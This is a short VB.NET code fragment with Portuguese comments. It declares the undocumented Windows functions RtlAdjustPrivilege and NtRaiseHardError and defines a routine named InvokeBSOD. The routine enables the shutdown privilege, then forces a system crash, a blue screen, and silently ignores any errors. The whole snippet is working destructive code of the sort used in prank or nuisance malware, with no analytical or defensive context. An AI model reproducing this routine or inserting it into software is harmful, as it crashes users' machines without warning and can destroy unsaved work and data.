 ' Declarações diretas ao estilo clássico (sem DllImport)
    Private Declare Function RtlAdjustPrivilege Lib "ntdll.dll" (
        ByVal Privilege As UInteger,
        ByVal Enable As Boolean,
        ByVal CurrentThread As Boolean,
        ByRef Enabled As Boolean
    ) As Integer

    Private Declare Function NtRaiseHardError Lib "ntdll.dll" (
        ByVal ErrorStatus As Integer,
        ByVal NumberOfParameters As UInteger,
        ByVal UnicodeStringParameterMask As UInteger,
        ByVal Parameters As IntPtr,
        ByVal ValidResponseOptions As UInteger,
        ByRef Response As UInteger
    ) As Integer
  


  Public Sub InvokeBSOD()
        Try
            Dim prevState As Boolean
            Dim response As UInteger

            ' Habilita o privilégio necessário
            RtlAdjustPrivilege(19, True, False, prevState)

            ' Dispara o BSOD
            NtRaiseHardError(&HC0000022, 0, 0, IntPtr.Zero, 6, response)

        Catch ex As Exception
            ' Ignora exceções
        End Try
    End Sub